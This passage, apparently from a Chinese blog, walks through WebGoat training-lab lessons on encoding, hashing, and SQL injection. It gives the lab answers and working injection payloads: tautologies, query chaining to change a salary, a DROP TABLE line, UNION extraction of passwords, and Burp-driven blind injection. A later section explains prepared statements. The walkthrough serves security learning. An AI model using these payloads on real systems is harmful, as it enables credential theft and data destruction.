<p>本 节 课 介绍 了 Web 应用程序中 常用 的 不同 类型 的 加密 技术。</p>
</blockquote>
<h4 id="2-Base64-Encoding">2.Base64 Encoding</h4>
<p>随便找个base64解密网站就行了（我上面工具有）</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/WebGoat/Introduction_General/13.png" alt="13">****</p>
<h4 id="3-Other-Encoding">3.Other Encoding</h4>
<p>这里介绍的其实是IBM WebSphere Application Server 使用特定的 XOR 编码实现将密码存储在配置文件中，用WebSphere解密才行</p>
<p><a target="_blank" rel="noopener" href="https://www.sysman.nl/wasdecoder/">WebSphere Password Decoder (sysman.nl)</a></p>
<p>答案这个是我上网搜的</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/WebGoat/Introduction_General/14.png" alt="13"></p>
<p>不知道为什么我的没有用，503了。。。估计是对面服务器的问题</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/WebGoat/Introduction_General/15.png" alt="15"></p>
<p>下面再给个要翻墙的网站，这个我测试了没有问题</p>
<p><a target="_blank" rel="noopener" href="https://strelitzia.net/wasXORdecoder/wasXORdecoder.html">strelitzia.net</a></p>
<h4 id="4-Hashing">4.Hashing</h4>
<p>这题的意思是要你现根据下面散列值的长度判断是哪种hash算法，再解密</p>
<p>但是我们用合适的工具就行了</p>
<p><a target="_blank" rel="noopener" href="https://www.cmd5.com/">md5在线解密破解</a></p>
<p>输入直接解密就行了</p>
<h4 id="5-2">5.</h4>
<p>这题再我不断地看提示和网上大佬的writeup后知道了要干什么（需要使用kali的openssl功能，主要是方便，在其他地方自行下载openssl的包也行）</p>
<p>首先他给了一个RSA密钥，要我们先用密钥求公钥，然后用公钥取模（第一空），再用sha256签名，再用base64加密</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">openssl rsa: 这是openssl工具的一个子命令，用于处理RSA密钥。</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">-<span class="keyword">in</span> test.key: 这指定了输入文件，其中包含私钥。在这个例子中，私钥存储在名为test.key的文件中。</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">-pubout: 这是一个标志，表示要输出公钥。</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">&gt; test.pub: 这将输出重定向到名为test.pub的文件中。</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">-<span class="keyword">in</span> test.pub: 这指定了输入文件，其中包含公钥。在这个例子中，公钥存储在名为test.pub的文件中。</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">-pubin: 这是一个标志，表示输入文件包含的是公钥。</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">-modulus: 这是一个标志，表示要输出模数。</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">-noout: 这是一个标志，表示不输出密钥本身，只输出模数。</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">在<span class="built_in">echo</span>命令中，-n选项用于抑制自动添加的换行符。</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">openssl dgst -sign key -sha256 | <span class="built_in">base64</span> 使用openssl的dgst命令（数据摘要和哈希工具）对输入进行签名。这里使用SHA-256哈希函数和一个私钥test.key进行签名，并将结果用<span class="built_in">base64</span>加密</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">1.生成公钥</span></span><br><span class="line">openssl rsa -in test.key -pubout &gt; test.pub </span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">2.获得模</span></span><br><span class="line">openssl rsa -in test.pub -pubin -modulus -noout</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">3.用sha256签名，再用<span class="built_in">base64</span>加密</span></span><br><span class="line">echo -n &quot;***&quot; | openssl dgst -sign key -sha256 | base64</span><br></pre></td></tr></table></figure>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/WebGoat/Introduction_General/17.png" alt="17"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/WebGoat/Introduction_General/18.png" alt="18"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/WebGoat/Introduction_General/16.png" alt="16"></p>
<h4 id="8">8.</h4>
<p>这题需要下载docker，我懒得下载直接去找的答案</p>
<p><a target="_blank" rel="noopener" href="https://blog.51cto.com/hvvyxs/5271326">【WebGoat通关思路】General / Crypto Basics_51CTO博客_webgoat通关攻略</a></p>
<p>答案是</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.Leaving passwords in docker images is not so secure</span><br><span class="line">2.default_secret</span><br></pre></td></tr></table></figure>
<h3 id="6-Writing-new-lesson">6.Writing new lesson</h3>
<p>主要是介绍叫你如何自己创造一道题目，这里我也直接给出答案</p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/lusuo/p/17711367.html">webgoat通关流程 - 让-雅克-卢梭 - 博客园 (cnblogs.com)</a></p>
<p>第一空是<code>secr37Value</code>，第二空随意</p>
<h2 id="3-Injection">3.Injection</h2>
<h3 id="1-SQL-Injection-intro-（SQL注入-简单版）">1.SQL Injection(intro)（SQL注入-简单版）</h3>
<h4 id="2-2">2.</h4>
<p>尝试检索员工 Bob Franco 的部门。 请注意，您已在此分配中被授予完全管理员权限，无需身份验证即可访问所有数据。</p>
<p>（简单的mysql语法练手）</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select department from Employees where userid=96134;</span><br></pre></td></tr></table></figure>
<h4 id="3-2">3.</h4>
<p>将 Tobi Barnett 的部门更改为“销售”。 请注意，您已在此分配中被授予完全管理员权限，无需身份验证即可访问所有数据。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">update employees set department=&#x27;Sales&#x27; where first_name=&#x27;Tobi&#x27;;</span><br></pre></td></tr></table></figure>
<h4 id="4-2">4.</h4>
<p>现在尝试通过将列 “phone” （varchar（20）） 添加到表 “employees” 来修改架构。:</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alter table employees add column phone varchar(20);</span><br></pre></td></tr></table></figure>
<h4 id="5-3">5.</h4>
<p>Try to grant rights to the table to user :grant_rightsunauthorized_user</p>
<p>给用户unauthorized_user赋予操作表grant_rights的权限。这里没有限制需要什么权限，我们把CRUD的权限都赋予用户</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grant select,insert,update,delete on grant_rights to unauthorized_user;</span><br></pre></td></tr></table></figure>
<h4 id="9">9.</h4>
<p>Try using the form below to retrieve all the users from the users table. You should not need to know any specific user name to get the complete list.</p>
<p>尝试使用下面的表格从用户表中检索所有用户。您不需要知道任何特定的用户名即可获取完整列表。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM user_data WHERE first_name = &#x27;John&#x27; AND last_name = &#x27;Smith&#x27; or &#x27;1&#x27; = &#x27;1&#x27;</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">这个查询之所以会返回所有字段，是因为 or <span class="string">&#x27;1&#x27;</span> = <span class="string">&#x27;1&#x27;</span> 这一部分始终为真。对于任何数据库来说，比较两个字符串 <span class="string">&#x27;1&#x27;</span> 和 <span class="string">&#x27;1&#x27;</span> 都是相等的，所以这个条件总是满足的。</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">意味着，不管 first_name 和 last_name 的值是什么，只要它们满足给定的条件，或者 <span class="string">&#x27;1&#x27;</span> = <span class="string">&#x27;1&#x27;</span> 这一条件满足，记录就会被选中。</span></span><br></pre></td></tr></table></figure>
<h4 id="10">10.</h4>
<p>使用下面的两个输入字段，尝试从用户表中检索所有数据。</p>
<p>警告：这些字段中只有一个容易受到 SQL 注入的影响。您需要找出哪个，才能成功检索所有数据。</p>
<p>通过使用<code>1 and 1=1</code>发现User-Id是注入点</p>
<p>Login_Conut:1</p>
<p>User_id:1 or 1=1</p>
<h4 id="11">11.</h4>
<p>你是一位名叫约翰·史密斯的员工，在一家大公司工作。 公司有一个内部系统，允许所有员工查看自己的内部数据，例如他们工作的部门和他们的薪水。</p>
<p>系统要求员工使用唯一的身份验证 TAN 来查看其数据。<br>
您当前的 TAN 是 3SL99A。</p>
<p>由于您总是渴望成为收入最高的员工，因此您希望利用该系统，而不是查看自己的内部数据，而是查看所有同事的数据以检查他们当前的工资。</p>
<p>使用下面的表格，并尝试从 employees 表中检索所有员工数据。您无需知道任何特定名称或 TAN 即可获得所需的信息。<br>
您已经发现，执行请求的查询如下所示：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot;SELECT * FROM employees WHERE last_name = &#x27;&quot; <span class="operator">+</span> name <span class="operator">+</span> &quot;&#x27; AND auth_tan = &#x27;&quot; <span class="operator">+</span> auth_tan <span class="operator">+</span> &quot;&#x27;&quot;;</span><br><span class="line"># <span class="string">&#x27;&quot; + name + &quot;&#x27;</span>赋值之后是<span class="string">&#x27;smith&#x27;</span>因为<span class="operator">+</span>再&quot;中变成了连接符连接&#x27;，如果去掉+和&quot;，name会单纯成为字符串</span><br></pre></td></tr></table></figure>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Employee Name:Smith&#x27; or 1 = 1 --</span><br><span class="line">Authentication TAN:123</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">--在sql是注释后面语句，Authentication TAN为什么都没有关系</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">但是我在Authentication TAN也使用相同的手法但是没有成功，说明这里不是注入点</span></span><br></pre></td></tr></table></figure>
<h4 id="12">12.</h4>
<p>Query chaining is exactly what it sounds like. With query chaining, you try to append one or more queries to the end of the actual query. You can do this by using the ; metacharacter. A ; marks the end of a SQL statement; it allows one to start another query right after the initial query without the need to even start a new line.</p>
<p>It is your turn!<br>
You just found out that Tobi and Bob both seem to earn more money than you! Of course you cannot leave it at that.<br>
Better go and change your own salary so you are earning the most!</p>
<p>Remember: Your name is John Smith and your current TAN is 3SL99A.</p>
<p>查询链接顾名思义。使用查询链接，您可以尝试将一个或多个查询追加到 实际查询。您可以使用 ; 元字符来执行此操作。A ;标记 SQL 语句的结尾;它允许在初始查询之后立即启动另一个查询，甚至不需要开始新行。</p>
<p>轮到你了！<br>
你刚刚发现 Tobi 和 Bob 似乎都比你赚更多的钱！ 当然，你不能就此罢休。<br>
最好去改变你自己的工资，这样你赚得最多！</p>
<p>请记住：您的名字是 John Smith，您当前的 TAN 是 3SL99A。</p>
<p>和上题一样，第二空填不填都无所谓</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Smith&#x27;;update employees set salary=144514 where auth_tan=&#x27;3SL99A&#x27;--</span><br></pre></td></tr></table></figure>
<h4 id="13">13.</h4>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;drop table access_log;--</span><br></pre></td></tr></table></figure>
<h3 id="2-SQL-injection-advanced-（SQL注入-高级版）">2.SQL injection(advanced)（SQL注入-高级版）</h3>
<h4 id="3-3">3.</h4>
<h5 id="第一种写法">第一种写法</h5>
<p>第一空</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Smith&#x27; UNION SELECT userid,user_name, password, &#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;, 1 from user_system_data --</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">完整语句</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">在SQL中，UNION操作符用于合并两个或多个SELECT语句的结果集。这些SELECT语句可以来自同一个表，也可以来自不同的表。在这个例子中，第一个SELECT语句是来自user_data表，而第二个SELECT语句是来自user_system_data表。</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">第二个SELECT语句中，你选择了user_name和password字段，并添加了一些常量值（如1和<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>）。这些常量值并不是来自user_system_data表的字段，而是为了满足UNION操作符的要求而添加的。</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">在UNION操作中，每个SELECT语句必须具有相同的列数，并且相应的列必须有兼容的数据类型。因此，如果你想将两个查询的结果合并在一起，你需要确保第二个查询的列数与第一个查询匹配。在这里，第一个查询选择了所有列，所以第二个查询也需要选择相同数量的列。</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">这些常量值在结果集中不会产生实际的数据，因为它们与查询的实际结果不匹配。它们仅仅是为了满足UNION的结构要求。</span></span><br></pre></td></tr></table></figure>
<p>发现密码</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">passW0rD</span><br></pre></td></tr></table></figure>
<h5 id="第二种写法">第二种写法</h5>
<p>原理其实都一样。。。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Smith&#x27; UNION SELECT 1,udt.user_name,udt.password,&#x27;2&#x27;,&#x27;3&#x27;,&#x27;4&#x27;,5 FROM user_data ud RIGHT JOIN user_system_data udt ON ud.userid=udt.userid;--</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Smith<span class="string">&#x27;：这部分尝试匹配user_data表中last_name为&#x27;</span>Smith<span class="string">&#x27;的记录。</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="string">UNION：这是一个SQL操作符，用于合并两个或多个SELECT语句的结果集。</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="string">SELECT 1,udt.user_name,udt.password,‘2’,‘3’,‘4’,5：这部分是第二个SELECT语句，它从user_system_data表中选择数据。这里选择了user_name和password字段，并添加了一些常量值（1, &#x27;</span>2<span class="string">&#x27;, &#x27;</span>3<span class="string">&#x27;, &#x27;</span>4<span class="string">&#x27;, 5）。</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="string">FROM user_data ud：这部分指定了第一个SELECT语句的来源表，即user_data，并给它起了一个别名ud。</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="string">RIGHT JOIN user_system_data udt ON ud.userid=udt.userid;：这部分是一个连接操作。它试图将user_data表（别名为ud）与user_system_data表（别名为udt）进行右连接，连接条件是两个表中的userid字段相等。</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="string">--：这是SQL中的注释符号，用于隐藏注入的SQL代码，使其更难以被数据库检测到。</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="string">整体上，这段代码的目的是通过SQL注入攻击来获取数据库中敏感的数据。它首先通过&#x27;</span>Smith<span class="string">&#x27;这个条件从user_data表中筛选出与&#x27;</span>Smith<span class="string">&#x27;相关的记录，然后使用UNION操作符将结果与从user_system_data表中获取的数据合并在一起。由于这是一个右连接，它会返回所有在user_data表中的记录，以及与之相关联的user_system_data表中的记录</span></span></span><br></pre></td></tr></table></figure>
<p>然后输入password就行了</p>
<h4 id="5-4">5.</h4>
<blockquote>
<p>这题我是真的要吐槽啊，题目说了是Tom，结果我抓包的时候修改成tom才有用😅</p>
</blockquote>
<p>1.按照题目要求说了漏洞在注册，那么注册的时候抓包</p>
<p>2.发送到repeater模块利用<code>username_reg=tom'+and+password=1</code>返回的output是none</p>
<p>而<code>username_reg=tom'+and+passwor=1</code>返回的是错误something went wrong</p>
<p>说明密码的字段名是password</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/WebGoat/Injection/8.png" alt=""></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/WebGoat/Injection/9.png" alt=""></p>
<p>3.然后利用<code>username_reg=tom'+and+(length(password) &gt; 10) --</code>判断密码长度</p>
<p>若正确则返回<code>User &#123;0&#125; already exists please try to register with a different username.</code></p>
<p>错误则返回你的输入</p>
<p>结束之后知道长度为23</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/WebGoat/Injection/6.png" alt=""></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/WebGoat/Injection/7.png" alt=""></p>
<p>4.发送到Intruder模块爆破</p>
<p>修改username_reg</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tom&#x27; and substring(password,1,1)=’1’--</span><br></pre></td></tr></table></figure>
<p>先设置好爆破位置，即后面两个1的位置，然后选择第四个集束炸弹（Clusterbomb）</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/WebGoat/Injection/3.png" alt=""></p>
<p>进入Intruder/Payloads，payload即是Positions页面的设置好的爆破位置变量，数字默认顺序从左往右递增。</p>
<p>负载1表示遍历第1至第23位数</p>
<p>负载2表示第一个变量（负载1）的所有可能性。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/WebGoat/Injection/5.png" alt=""></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/WebGoat/Injection/4.png" alt=""></p>
<p>进行爆破</p>
<p>查看长度最小的排序就是密码</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/WebGoat/Injection/1.png" alt=""></p>
<p>然后可以试一个发送个repeater模块</p>
<p>确实没有问题</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/WebGoat/Injection/2.png" alt=""></p>
<p>但是一次没有收集全所有位数的字母，是因为有些请求出错了，经过多次攻击可以集齐所有位字母。<br>
最终答案：thisisasecretfortomonly<br>
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23<br>
t h i s i s a s e c r e t f o r t o m o n l y<br>
<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/WebGoat/Injection/10.png" alt=""></p>
<h4 id="6-3">6.</h4>
<h5 id="1">1.</h5>
<p>预编译语句（Prepared Statement）和普通语句（Statement）的主要区别：</p>
<ol>
<li><strong>参数化</strong>：预编译语句使用占位符来代替实际的值，在执行时再将实际值绑定到占位符上。这样做可以防止SQL注入攻击，因为参数化的值不会被解释为SQL代码的一部分。普通语句则直接将值嵌入到SQL代码中，这可能导致SQL注入风险。</li>
<li><strong>性能</strong>：对于多次执行的相同SQL结构但不同参数的查询，预编译语句通常比普通语句更快。这是因为数据库只需要解析SQL结构一次，然后可以多次使用已解析的结构来执行查询。普通语句每次执行时都需要解析。</li>
<li><strong>存储</strong>：预编译语句的结构可以被数据库存储，以便后续重用，但实际的参数值不会被存储。然而，这取决于数据库的实现和配置；有些数据库可能不存储预编译语句的结构。普通语句不会被存储，除非它们被包含在存储过程或触发器中。</li>
</ol>
<p>然后看题目</p>
<ul>
<li>Solution 1: Prepared statements are statements with hard-coded parameters.（错误）预编译语句不是使用硬编码参数的语句；相反，它们使用占位符来代替参数。</li>
<li>Solution 2: Prepared statements are not stored in the database.（部分正确但不完全）预编译语句的结构可以被数据库存储，但实际的参数值不会被存储。然而，这个选项的表述可能会引起误解，因为它暗示预编译语句从不被存储，而实际上它们的结构有时会被存储。</li>
<li>Solution 3: A statement is faster.（错误）这个表述没有指明是哪种类型的语句（预编译的还是普通的），而且在没有上下文的情况下，无法确定哪种类型的语句更快。在重复执行的情况下，预编译语句通常比普通语句更快。</li>
<li>Solution 4: A statement has got values instead of a prepared statement.（部分正确但不清晰）这个选项似乎在暗示普通语句直接包含值，而预编译语句使用占位符。然而，这个表述不够清晰和准确。</li>
</ul>
<p>没有一个选项是完美的答案，但如果必须选择一个最接近的，那么Solution 4在修改后可能最接近正确答案：一个普通语句（非预编译的）直接在SQL代码中包含值，而预编译语句使用占位符并在执行时绑定值</p>
<h5 id="2-3">2.</h5>
<p>在SQL语句中，通常使用问号(?)作为参数的占位符。当执行预编译的SQL语句时，可以使用参数化查询将参数值绑定到占位符上。这样做可以防止SQL注入攻击，并提高查询的性能。</p>
<p>例如，在Python的SQLite库中，可以使用问号(?)作为占位符，并使用参数化查询来绑定参数值：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sqlite3  </span><br><span class="line">  </span><br><span class="line">conn = sqlite3.connect(<span class="string">&#x27;example.db&#x27;</span>)  </span><br><span class="line">cursor = conn.cursor()  </span><br><span class="line">  </span><br><span class="line"><span class="comment"># 创建预编译的SQL语句  </span></span><br><span class="line">query = <span class="string">&quot;INSERT INTO table_name (column1, column2) VALUES (?, ?)&quot;</span>  </span><br><span class="line">  </span><br><span class="line"><span class="comment"># 绑定参数值  </span></span><br><span class="line">params = (<span class="string">&#x27;value1&#x27;</span>, <span class="string">&#x27;value2&#x27;</span>)  </span><br><span class="line">cursor.execute(query, params)  </span><br><span class="line">  </span><br><span class="line">conn.commit()  </span><br><span class="line">cursor.close()  </span><br><span class="line">conn.close()</span><br></pre></td></tr></table></figure>
<p>在上面的例子中，问号(?)作为占位符，用于表示将要插入的值的位置。然后使用参数化查询将参数值绑定到占位符上，避免了SQL注入攻击的风险。</p>
<h5 id="3-4">3.</h5>
<ol>
<li><strong>Solution 1: They are not static so they can compile better written code than statements.</strong>
<ul>
<li>这个说法并不准确。预编译的语句和普通语句在编译时都有其动态和静态的方面。预编译的语句并不是静态的，但这并不意味着它们能“编译更好的代码”。实际上，预编译的语句主要在执行时更加高效，而不是在编译时。</li>
</ul>
</li>
<li><strong>Solution 2: Prepared statements are compiled once by the database management system waiting for input and are pre-compiled this way.</strong>
<ul>
<li>这个说法是正确的。预编译的语句在首次执行时会被数据库管理系统编译，并且会等待输入。这样的预编译可以提高后续执行的效率，因为数据库管理系统可以重用已编译的版本，而不是每次都重新编译。</li>
</ul>
</li>
<li><strong>Solution 3: Prepared statements are stored and wait for input it raises performance considerably.</strong>
<ul>
<li>这个说法有些模糊。预编译的语句可以被存储以便后续重用，但这并不是提高性能的主要原因。更重要的是预编译语句的编译和执行效率。存储预编译的语句可以进一步提高性能，但这并不是预编译的主要优势。</li>
</ul>
</li>
<li><strong>Solution 4: Oracle optimized prepared statements. Because of the minimal use of the databases resources it is faster.</strong>
<ul>
<li>这个说法可能只适用于Oracle数据库系统。确实，数据库管理系统（如Oracle）可能会针对预编译的语句进行优化，从而使其执行得更快。这是因为预编译的语句减少了动态SQL带来的性能开销，如语法解析和查询计划生成。但是，这种优化并不适用于所有数据库系统，所以这个说法是有针对性的。</li>
</ul>
</li>
</ol>
<p>综上所述，最准确和全面的解释是：预编译的语句在首次执行时被数据库管理系统编译，并在后续执行中重用已编译的版本，从而提高性能。这种性能提升是由于避免了重复的解析、优化和编译步骤。此外，一些数据库系统（如Oracle）还针对预编译的语句进行了优化，进一步提高了其性能。</p>
<h5 id="4-3">4.</h5>
<ol>
<li>
<p><strong>Solution 3</strong>：Placeholders can prevent that the users input gets attached to the SQL query resulting in a seperation of code and data。</p>
<p>解释：预编译的语句使用占位符来代替用户输入，确保用户输入与SQL查询的逻辑分离。这意味着用户输入不会被解释为SQL代码的一部分，从而防止了SQL注入攻击。通过使用占位符，数据库系统能够控制和验证输入的格式和类型，有效地防止恶意输入被解释为SQL命令。这种分离确保了代码和数据的安全性，防止了潜在的安全漏洞。</p>
</li>
<li>
<p><strong>Solution 1: Prepared statements have got an inner check to distinguish between input and logical errors.</strong></p>
<ul>
<li>这个说法并不准确。预编译的语句本身并没有一个“内部检查”来区分输入和逻辑错误。预编译的语句主要是通过参数化输入来防止SQL注入攻击，而不是通过区分输入和逻辑错误。</li>
</ul>
</li>
<li>
<p><strong>Solution 2: Prepared statements use the placeholders to make rules what input is allowed to use.</strong></p>
<ul>
<li>这个说法也是不准确的。虽然预编译的语句确实使用占位符，但它们并不是用来“制定规则”来决定输入的使用方式。占位符的主要目的是为了安全地处理用户输入，防止SQL注入攻击。</li>
</ul>
</li>
<li>
<p><strong>Solution 4: Prepared statements always read inputs literally and never mixes it with its SQL commands.</strong></p>
<ul>
<li>这个说法部分正确，但也部分误导。预编译的语句确实将用户输入作为字面值处理，而不是将其解释为SQL代码的一部分。但是，这并不意味着预编译的语句“从不混合”输入与SQL命令。实际上，预编译的语句在执行时，会将占位符替换为实际的用户输入，并与SQL命令一起执行。关键在于这种替换是安全的，因为占位符确保了用户输入被当作数据而不是代码处理。</li>
</ul>
</li>
</ol>
<p>综上所述，预编译的语句通过使用占位符来分离代码和数据，确保用户输入被当作数据而不是代码处理，从而有效地防止SQL注入攻击。</p>
<h5 id="5-5">5.</h5>
<p>这段代码试图在表单中输入恶意SQL代码，目的是删除名为&quot;Students&quot;的表。</p>
<p>现在，我们逐一分析提供的解决方案：</p>
<ol>
<li><strong>Solution 1: The table Students and all of its content will be deleted.</strong>
<ul>
<li>这个说法是错误的。如果一个恶意用户尝试使用这样的输入，并且数据库没有采取适当的预防措施（例如使用预编译的语句），那么表&quot;Students&quot;及其所有内容将被删除。但是没有提及注册新用户</li>
</ul>
</li>
<li><strong>Solution 2: The input deletes all students with the name Robert.</strong>
<ul>
<li>这个说法是不正确的。实际上，这段代码会删除整个&quot;Students&quot;表，而不是只删除名为&quot;Robert&quot;的学生。</li>
</ul>
</li>
<li><strong>Solution 3: The database registers ‘Robert’ and deletes the table afterwards.</strong>
<ul>
